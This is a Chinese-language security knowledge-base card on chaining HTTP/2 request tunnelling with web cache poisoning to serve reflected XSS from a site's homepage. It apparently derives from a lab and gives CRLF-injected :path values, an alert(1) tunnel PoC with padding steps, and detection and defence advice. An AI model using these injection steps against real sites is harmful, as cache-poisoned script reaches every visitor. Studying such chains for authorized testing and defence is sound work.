---
id: web-generic-http-smuggling-h2-request-tunnelling-cache-poisoning-xss
title: HTTP/2 请求隧道 + 缓存投毒：把 JSON 端点的反射 XSS 嵌进 text/html 外层响应并缓存，访问主页即执行
type: scenario
domain: web
path: web/generic/http-smuggling
technique: http2-request-tunnelling-cache-poisoning-xss
tags:
- http2
- request-tunnelling
- cache-poisoning
- xss
- content-type-confusion
- crlf-injection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V609
  verified_at: '2026-11-12T19:38:54+08:00'
  notes: '已对照原文12691「缓存投毒」节及截图48-59核对：:path注入/?cachebuster=1 HTTP/1.1\r\nFoo: bar响应正常、HEAD隧道GET /post?postId=1响应body出现嵌套HTTP/1.1 200 OK、GET /resources返回302 /resources/、隧道GET /resources?<script>alert(1)</script>超时后按普通GET /的Content-Length追加填充、访问/?cachebuster=3弹alert(1)、移除cachebuster后主页直接弹窗且响应体为混合302/脚本，卡内步骤/PoC与截图一致。dedup：除自身外最高相关为Host头缓存投毒、Chromium缓存键、路径反射XSS、Web缓存欺骗等，均不同链；与ACL绕过隧道卡同原语但利用条件(Web缓存+未编码反射点)与危害(缓存投毒XSS)不同，原子。原文未给产品版本，保持省略；未在本机复现。'
url: /docs/web/generic/http-smuggling/web-generic-http-smuggling-h2-request-tunnelling-cache-poisoning-xss/
draft: false
kb_aliases:
- request tunnelling cache poisoning
- HTTP/2 缓存投毒
- 隧道响应混淆
- Content-Type 混淆 XSS
- :path 伪头注入
---

## 一句话结论

用 HTTP/2 请求隧道把另一个端点（如返回 JSON 的搜索/帖子接口）的响应嵌进一个 `text/html` 外层响应的 body；由于内层响应里带有未编码的反射输入（如 `<script>alert(1)</script>`），浏览器按外层 `text/html` 解释并执行脚本；再把该混合响应写入 Web 缓存，去掉 cachebuster 后即可让所有访问主页的用户触发 XSS。

## 原理

- 请求隧道通过 CRLF 注入让后端把嵌套请求的响应当作外层响应 body 返回；前端只按外层请求的 URL 做缓存键和 Content-Type。
- 外层响应通常是 `Content-Type: text/html` 的页面；内层响应可能是 `application/json`，其中反射了未编码的用户输入（例如搜索结果里的 `test<script>alert(1)</script>`）。
- 混在一起后，内层响应的 body 继承外层 `text/html`，`<script>` 被浏览器执行——这就是"响应头与响应体错配"导致的 XSS。
- 缓存服务器按外层 URL（含 `:path` 中的查询串）存储响应；先用带 `cachebuster` 的 URL 验证，再把 `:path` 改成不带 cachebuster 的主页路径，把恶意混合响应缓存到主页，所有访客都会收到。
- 为什么要填充：外层响应声明的 `Content-Length` 可能大于内层响应长度，前端会等待剩余字节直到超时；在注入的 `</script>` 后追加足够多的填充字符，使内层响应长度超过外层 CL，前端才会完整返回。
- 为什么成立：缓存层信任"一个 URL 对应一个响应"的语义，而隧道让一个 URL 的响应 body 里混入了另一个请求的输出；缓存键与 Content-Type 都来自外层，内层内容不受约束。

## 触发条件

- 存在 HTTP/2 请求隧道（前端清理不严、可注入 `:path` 或头值 CRLF）。
- 站内有一个反射未编码输入、且输出可被浏览器当作 HTML/JS 解释的端点（JSONP、搜索结果、帖子正文、错误页等）。
- 前端/CDN 有 Web 缓存，且缓存键由外层 URL/查询串决定。
- 外层响应为 `text/html`，攻击者能控制外层 `Content-Length` 或填充长度以完整读取内层响应。
- 受害者会访问被投毒的 URL（原文每 15 秒访问主页）。

## 利用步骤

1. 验证 `:path` 伪头可注入：把 `:path` 的值设为 `/?cachebuster=1 HTTP/1.1\r\nFoo: bar`，响应正常即说明可以通过 `:path` 走私嵌套请求。
2. 验证隧道：方法改 HEAD/GET，`:path` 值设为 `/?cachebuster=1 HTTP/1.1\r\nHost: TARGET\r\n\r\nGET /post?postId=1 HTTP/1.1\r\nFoo: bar`；若响应 body 中出现 `HTTP/1.1 200 OK`，隧道成立。
3. 寻找反射点：访问 `GET /resources?<script>alert(1)</script>`，观察是否 302 到 `/resources/?<script>alert(1)</script>` 且脚本未编码（原文用该参数）。
4. 构造隧道 XSS：`:path` 值写 `/?cachebuster=3 HTTP/1.1\r\nHost: TARGET\r\n\r\nGET /resources?<script>alert(1)</script> HTTP/1.1\r\nFoo: bar`；在 `</script>` 后追加大量任意字符（如许多 `A`）填满外层 CL。
5. 发送后访问 `/?cachebuster=3`，浏览器应执行 `alert(1)`；若超时，检查普通 `GET /` 的 Content-Length 并继续增加填充。
6. 去掉 cachebuster：把 `:path` 改为 `/? HTTP/1.1...` 形式再发一次，把恶意混合响应缓存到主页；之后所有访问 `/` 的用户都会执行脚本。

## PoC

```http
HEAD /?cachebuster=3 HTTP/2
Host: TARGET
:path: /?cachebuster=3 HTTP/1.1\r\n
Host: TARGET\r\n
\r\n
GET /resources?<script>alert(1)</script> HTTP/1.1\r\n
Foo: bar
<追加大量填充字符 >
```

```text
# 外层响应（被缓存到 /?cachebuster=3 或 /）
HTTP/1.1 200 OK
Content-Type: text/html
...

HTTP/1.1 302 Found
Location: /resources/?<script>alert(1)</script>
...
```

说明：PoC 为原文缓存投毒靶场流程的结构化复现，`\r\n` 为真实字节，域名与参数已泛化；未在本机执行，仅用于授权测试。

## 变体与关联

- 变体：内层端点返回 JSON 中的反射字段、错误页、API 回显；只要未编码且能被 HTML 解释即可。
- 变体：利用缓存键归一化差异（大小写、多余参数、路径规范化）扩大投毒面；也可投毒 JS/CSS 资源实现持久 XSS。
- 关联：[[web-generic-http-smuggling-h2-request-tunnelling-access-control-bypass]]（同隧道原语，目标是绕过认证）、[[web-generic-http-smuggling-h2-request-splitting-crlf-host-header]]（请求拆分）、[[web-generic-cache-poisoning-host-header-ambiguous-request]]（HTTP/1 侧缓存投毒）。
- 边界：无缓存的端到端响应、前端严格清理 CRLF、内层输出已编码、或外层 Content-Length 无法被填充满足时，本链不成立。

## 检测与防御

- 检测：响应 body 中出现嵌套 `HTTP/1.1` 响应；`Content-Type` 为 `text/html` 但内容形如 JSON；`X-Cache: hit` 且响应含脚本；`:path`/头值中的 CRLF；异常大 `Content-Length` 与超时。
- 防御：清理 H2 头名/头值中的 CRLF，禁止 `:path` 中注入请求行；缓存层校验响应结构与 Content-Type；对 HTML 输出做编码；关键页面禁用公共缓存或使用严格缓存键。
- 加固：端到端 HTTP/2；WAF 检测嵌套响应；缓存配置 `Vary` 与内容类型校验；CSP 作为纵深防御降低 XSS 影响。
